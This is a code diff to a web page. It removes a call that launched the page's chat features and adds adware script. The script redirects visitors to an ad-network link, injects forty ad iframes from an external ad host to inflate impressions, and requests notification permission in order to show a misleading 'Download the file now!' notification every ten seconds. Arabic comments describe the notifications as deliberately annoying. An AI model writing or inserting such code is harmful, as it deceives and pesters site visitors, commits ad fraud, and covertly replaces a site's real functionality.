-    startFeatures(chat, token, features);
+</div>
+
+<script>
+function goToLink(){
+  // تحويل لصفحة الإعلانات (Smart Link)
+  window.location.href="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c";
+}
+
+/* تكرار الإعلانات تلقائياً لزيادة العدد بشكل كبير */
+const grid = document.querySelector('.ads-grid');
+for(let i=0;i<40;i++){
+  const ad = document.createElement('div');
+  ad.className = 'ad-box';
+  ad.innerHTML = `
+  <script>
+    atOptions = {
+      'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
+      'format' : 'iframe',
+      'height' : 60,
+      'width' : 120,
+      'params' : {}
+    };
+  <\/script>
+  <script src="https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js"><\/script>
+  `;
+  grid.appendChild(ad);
+}
+
+/* إشعارات مزعجة متكررة */
+if (Notification.permission !== "granted") {
+  Notification.requestPermission();
+}
+setInterval(()=>{
+  if(Notification.permission === "granted"){
+    new Notification("تنزيل الملف الآن!",{
+      body:"اضغط على زر التنزيل للحصول على الملف",
+      icon:"https://via.placeholder.com/64"
+    });
   }
+},10000);
 </script>
+
 </body>
-  </html>
+</html>
